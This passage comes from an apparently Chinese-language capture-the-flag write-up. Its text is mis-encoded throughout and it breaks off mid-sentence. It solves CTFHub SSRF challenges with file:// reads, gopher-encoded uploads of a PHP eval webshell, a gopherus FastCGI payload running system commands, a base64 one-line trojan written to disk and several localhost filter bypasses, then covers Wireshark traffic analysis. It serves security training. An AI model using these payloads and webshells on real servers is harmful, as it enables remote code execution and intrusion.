class="attribute">Date</span><span class="punctuation">: </span>Mon, 10 Apr 2023 07:44:48 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>206</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>*</span><br><span class="line">  </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 10 Apr 2023 07:44:43 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.4.25 (Debian)</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>32</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line">  </span><br><span class="line">ctfhub&#123;dbcc1a3f4c6fb16d610f70aa&#125;</span><br></pre></td></tr></table></figure></li></ul><h4><span id="ä¸Šä¼ æ–‡ä»¶">ä¸Šä¼ æ–‡ä»¶</span></h4><ol><li>æŸ¥çœ‹æºä»£ç </li></ol><p>å‘é€</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-eff97dea17259597.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿”å›</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure><p>å‘é€</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-eff97dea17259597.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>è¿”å›</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Upload Webshell</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>å¾—çŸ¥æ˜¯è¦æ„é€ ä¸€ä¸ªè¡¨å•æäº¤ã€‚</p><ol start="2"><li>ä½¿ç”¨httpåè®®ï¼Œè®¿é—®flag.php</li></ol>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-eff97dea17259597.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p>å‘ç°å¹¶æ²¡æœ‰æäº¤çš„buttonï¼Œæˆ‘ä»¬éœ€è¦è‡ªå·±å†™ä¸€ä¸ª</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åbpæŠ“åŒ…</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>330</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://challenge-eff97dea17259597.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryqNWrH2XOYKqFjQzw</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://challenge-eff97dea17259597.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryqNWrH2XOYKqFjQzw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.pphphp&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryqNWrH2XOYKqFjQzw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">Ã¦ÂÂÃ¤ÂºÂ¤</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryqNWrH2XOYKqFjQzw--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>  ç¼–ç ä¸¤æ¬¡ç»“æœ</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gohper://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520330%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A//challenge-eff97dea17259597.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryqNWrH2XOYKqFjQzw%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Macintosh%253B%2520Intel%2520Mac%2520OS%2520X%252010_15_7%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/103.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A//challenge-eff97dea17259597.sandbox.ctfhub.com%253A10800/%253Furl%253Dhttp%253A//127.0.0.1/flag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryqNWrH2XOYKqFjQzw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522shell.pphphp%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2527shell%2527%255D%2529%253B%2520%253F%253E%250D%250A------WebKitFormBoundaryqNWrH2XOYKqFjQzw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%250D%250A------WebKitFormBoundaryqNWrH2XOYKqFjQzw--</span><br></pre></td></tr></table></figure><p>è®¿é—®index.phpæŠ“åŒ…ï¼Œæ„é€ payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">ä¸çŸ¥é“ä¸ºå•¥è¿‡ä¸äº†ï¼Œå’Œç½‘ä¸Šæµç¨‹éƒ½ä¸€æ ·ï¼Œä¸ç®¡</span><br><span class="line"></span><br><span class="line">#### fastcgi</span><br><span class="line"></span><br><span class="line">- è¿™é‡Œè¦ç”¨åˆ°**gopherus**ç±»è¿›è¡Œpayloadç”Ÿæˆ</span><br><span class="line"></span><br><span class="line">  ```cmd</span><br><span class="line">  python2 gopherus --exploit fastcgi</span><br><span class="line">  /var/www/html/index.php</span><br><span class="line">  ls</span><br><span class="line">  # è·å¾—</span><br><span class="line">  gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27ls%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure><p>  ç„¶åå†è¿›è¡Œä¸€æ¬¡urlç¼–ç <br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527ls%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span><br></pre></td></tr></table></figure></p><ul><li><p>ä½¿ç”¨bpçš„repeaterå‘é€åè·å–</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NX-Powered-By: PHP/5.6.40</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">index.php</span><br><span class="line">-----Made-by-SpyD3r-----</span><br><span class="line">htm</span><br></pre></td></tr></table></figure></li><li><p>ç„¶åé‡å¤ä¸Šè¿°æ“ä½œï¼Œè¾“å…¥å¹¶è¿›è¡Œurlç¼–ç å³å¯è·å–flag</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /</span><br><span class="line">ls /flag</span><br></pre></td></tr></table></figure></li><li><p>ä¹Ÿå¯ä»¥å†™ä¸ªä¸€å¥è¯æœ¨é©¬ä¸Šå»</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> JTNDJTNGcGhwJTIwZXZhbCUyOCUyNF9QT1NUJTVCc2hlbGwlNUQlMjklM0IlM0YlM0UlMDA= | base64 -d &gt; /var/www/html/shel1.php</span><br></pre></td></tr></table></figure></li></ul><p>å…¶ä¸­*&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php<em>å¯ä»¥ç”¨</em>&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php*ä»£æ›¿ï¼Œå°±æ˜¯æœåŠ¡å™¨é‡Œé¢æœ‰çš„phpæ–‡ä»¶å³å¯ï¼Œpearæ˜¯è‡ªå¸¦çš„ã€‚</p><p><a href="https://www.modb.pro/db/163739">åŸç†å‚è€ƒ</a></p><h4><span id="redisåè®®">Redisåè®®</span></h4><ul><li><p>é€šè¿‡gopherusä¸€æŠŠæ¢­</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis</span><br><span class="line">PHPShell</span><br><span class="line">&lt;?php eval($_POST[shell]);?&gt;</span><br></pre></td></tr></table></figure></li><li><p>å†è¿›è¡Œä¸€æ¬¡urlç¼–ç å³å¯</p></li></ul><h4><span id="url-bypass">URL Bypass</span></h4><p>è¿™ä¸ªé¢˜çš„è€ƒç‚¹ä¸DNSè§£ææœ‰å…³ï¼Œåƒæˆ‘ä»¬å¹³æ—¶è¾“å…¥çš„ç™¾åº¦ç½‘å€<a href="http://www.baidu.comä¸­çš„wwwæ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿæˆ‘ä»¬ç®€å•äº†è§£ä¸€ä¸‹åŸŸåè§£æå‰ç¼€çš„ä½œç”¨">www.baidu.comä¸­çš„wwwæ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿæˆ‘ä»¬ç®€å•äº†è§£ä¸€ä¸‹åŸŸåè§£æå‰ç¼€çš„ä½œç”¨</a></p><p>wwwï¼šäºŒçº§åŸŸåè§£æï¼Œä»¥ç™¾åº¦ä¸ºä¾‹ï¼Œå°±æ˜¯<a href="http://www.baidu.com/">www.baidu.com</a></p><p>@ ï¼šä¸»åŸŸåè§£æï¼Œå³@ç¬¦å·åé¢ç›´æ¥è·ŸåŸŸåï¼Œå¦‚æœå‰é¢æœ‰ä¸œè¥¿ï¼Œä¼šè¢«å¿½ç•¥ã€‚</p><p>*ï¼šæ˜¯æŒ‡æ³›è§£æï¼Œæ˜¯æŒ‡é™¤å·²æ·»åŠ çš„è§£æè®°å½•ä»¥å¤–çš„æ‰€æœ‰ä¸»æœºéƒ½ä»¥æ­¤ä¸ºå‡†ï¼Œä»¥ç™¾åº¦ä¸ºä¾‹ï¼Œå°±æ˜¯ 12343.baidu.comã€‚</p><ul><li><p>è¿™é“é¢˜ç›´æ¥ä½¿ç”¨@è·³è¿‡</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://notfound.ctfhub.com@127.0.0.1:80/flag.php</span><br></pre></td></tr></table></figure></li></ul><p><a href="https://blog.csdn.net/xhy18634297976/article/details/120895812">å…¶ä»–æ–¹æ³•</a></p><h4><span id="æ•°å­—ip-bypass">æ•°å­—IP Bypass</span></h4><p><a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">IPåœ°å€è½¬æ¢</a></p><ul><li><p>æ–¹æ³•ä¸€ï¼šé€šè¿‡IPåœ°å€è½¬æ¢ï¼Œå°†10è¿›åˆ¶çš„æ•°ä»£æ›¿127.0.0.1å³å¯ï¼Œæˆ–è€…16è¿›åˆ¶å‰é¢åŠ ä¸ª0x</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-8c88f2c702488010.sandbox.ctfhub.com:10800/?url=2130706433:80/flag.php</span><br><span class="line"></span><br><span class="line">http://challenge-b558d4473913b437.sandbox.ctfhub.com:10800/?url=0x7F000001:80/flag.php</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼šä½¿ç”¨localhost</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-8c88f2c702488010.sandbox.ctfhub.com:10800/?url=localhost:80/flag.php</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•ä¸‰ï¼›ç‰¹æ®Šåœ°å€<a href="http://0.0.0.0/">http://0/</a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-8c88f2c702488010.sandbox.ctfhub.com:10800/?url=0/flag.php</span><br></pre></td></tr></table></figure></li></ul><h4><span id="302è·³è½¬">302è·³è½¬</span></h4><ul><li>å¸¸è§„è§£æ³•å‚è€ƒä¸Šé¢˜èƒ½åšã€‚</li><li>ä½¿ç”¨<a href="https://www.bejson.com/convert/shorturl/">çŸ­åœ°å€è½¬æ¢</a> <code>http://127.0.0.1/flag.php</code>å³å¯</li></ul><h4><span id="dnsé‡ç»‘å®š-bypass">DNSé‡ç»‘å®š Bypass</span></h4><ul><li><p><strong>åŒæºç­–ç•¥</strong>ï¼šä¸¤ä¸ªURLä½¿ç”¨ç›¸åŒçš„<font color="red"><em><strong>åè®®ã€åŸŸåã€ç«¯å£</strong></em> </font>ï¼ˆIEæµè§ˆå™¨æ²¡æœ‰ç«¯å£ï¼‰ä¸‰è€…ç›¸åŒåˆ™ç§°ä¸ºåŒæºã€‚ç®€å•æ¥è¯´åŒæºå°±æ˜¯ä¸ºäº†ä½¿ä¸€ä¸ªåŸŸåä¸‹çš„ç½‘ç«™åªèƒ½è°ƒç”¨æœ¬åŸŸåä¸‹çš„èµ„æºï¼Œé˜²æ­¢å…¶å®ƒåŸŸåçš„è®¿é—®é€ æˆä¸€äº›å±å®³ã€‚</p></li><li><p>DNSé‡ç»‘å®šï¼šåœ¨ç½‘é¡µæµè§ˆè¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·åœ¨åœ°å€æ ä¸­è¾“å…¥åŒ…å«åŸŸåçš„ç½‘å€ã€‚æµè§ˆå™¨é€šè¿‡DNSæœåŠ¡å™¨å°†åŸŸåè§£æä¸ºIPåœ°å€ï¼Œç„¶åå‘å¯¹åº”çš„IPåœ°å€è¯·æ±‚èµ„æºï¼Œæœ€åå±•ç°ç»™ç”¨æˆ·ã€‚è€Œå¯¹äºåŸŸåæ‰€æœ‰è€…ï¼Œä»–å¯ä»¥è®¾ç½®åŸŸåæ‰€å¯¹åº”çš„IPåœ°å€ã€‚å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®ï¼Œè§£æåŸŸåè·å–ä¸€ä¸ªIPåœ°å€ï¼›ç„¶åï¼ŒåŸŸåæŒæœ‰è€…ä¿®æ”¹å¯¹åº”çš„IPåœ°å€ï¼›ç”¨æˆ·å†æ¬¡è¯·æ±‚è¯¥åŸŸåï¼Œå°±ä¼šè·å–ä¸€ä¸ªæ–°çš„IPåœ°å€ã€‚å¯¹äºæµè§ˆå™¨æ¥è¯´ï¼Œæ•´ä¸ªè¿‡ç¨‹è®¿é—®çš„éƒ½æ˜¯åŒä¸€åŸŸåï¼Œæ‰€ä»¥è®¤ä¸ºæ˜¯å®‰å…¨çš„ã€‚ï¼ˆæµè§ˆå™¨åŒæºç­–ç•¥ï¼‰ è¿™å°±æ˜¯DNS Rebindingæ”»å‡»ã€‚</p></li><li><p><a href="https://zhuanlan.zhihu.com/p/89426041">å‚è€ƒ</a></p></li><li><p><a href="https://lock.cmpxchg8b.com/rebinder.html">é‡ç»‘å®šå·¥å…·åœ°å€</a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-008000c7973432be.sandbox.ctfhub.com:10800/?url=7f000001.c0a80001.rbndr.us/flag.php</span><br></pre></td></tr></table></figure></li></ul><h1><span id="reverse">Reverse</span></h1><h1><span id="crypto">Crypto</span></h1><h1><span id="misc">Misc</span></h1><h3><span id="æµé‡åˆ†æ">æµé‡åˆ†æ</span></h3><ul><li>ä½¿ç”¨åˆ°å·¥å…·æ˜¯<strong>WireShark</strong></li></ul><h4><span id="mysqlæµé‡">Mysqlæµé‡</span></h4><ul><li>ç›´æ¥ä¸‹è½½åŒ…ï¼Œç„¶ååœ¨filteré‡Œé¢è¾“å…¥mysqlï¼Œç„¶åçœ‹infoé‡Œé¢ç™»å½•æˆåŠŸçš„é‚£æ¡</li><li>ä½¿ç”¨<strong>follow tcp stream</strong> ç„¶ååœ¨<strong>find</strong>é‡Œé¢è¾“å…¥å…³é”®å­—<code>ctf</code>å³å¯ã€‚</li></ul><h4><span id="redisæµé‡">Redisæµé‡</span></h4><ul><li><p>ä½¿ç”¨<strong>follow tcp stream</strong> ç„¶ååœ¨<strong>find</strong>é‡Œé¢è¾“å…¥å…³é”®å­—<code>ctf</code>å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Fl4g1</span><br><span class="line">$22</span><br><span class="line">ctfhub&#123;6051d6123de43df</span><br><span class="line">+OK</span><br><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$5</span><br><span class="line">flag2</span><br><span class="line">$18</span><br><span class="line">ad7609804925c0121&#125;</span><br></pre></td></tr></table></figure><p>æ‹¼æ¥å‡º<code>ctfhub&#123;6051d6123de43dfad7609804925c0121&#125;</code></p></li></ul><h4><span id="mongodb">MongoDB</span></h4><ul><li>ä¹Ÿæ˜¯ç›´æ¥è·Ÿè¸ªæµï¼Œç„¶åæ—è¾¹æœ‰ä¸ªé€‰é¡¹å¯ä»¥ç›´æ¥é€‰æ‹©ç¬¬å‡ 